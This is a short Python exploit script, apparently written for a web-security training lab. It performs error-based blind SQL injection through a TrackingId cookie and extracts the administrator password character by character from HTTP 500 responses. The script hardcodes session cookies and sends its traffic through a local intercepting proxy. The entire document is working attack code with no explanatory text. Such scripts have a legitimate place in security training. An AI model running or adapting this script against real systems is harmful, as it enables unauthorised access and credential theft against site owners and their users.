import requests ,sys, urllib3, urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def exploit_sqli(url):
    extracted_password = ""
    traking_id_cookie = "3razirNdal2rG3Ye"
    session_id_cookie = "Adf4LcQIQB1X85M6aEFYW9swxjEx1jIY"
    for i in range(1,21):
        for j in range(32,126):
            payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,{i},1)='{chr(j)}') || '"
            encoded_payload = urllib.parse.quote(payload)
            cookies = {'TrackingId': traking_id_cookie + encoded_payload, 'session': session_id_cookie}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                extracted_password += chr(j)
                sys.stdout.write('\r' + extracted_password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + extracted_password + chr(j))
                sys.stdout.flush()

def main():
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f'[-] Usage: python3 {sys.argv[0]} <url>')
        print(f'[-] Example: python3 {sys.argv[0]} http://example.com')
        sys.exit(1)
    
    print('[*] Reteriving the administrator password...')
    exploit_sqli(url)

if __name__ == "__main__":
    main()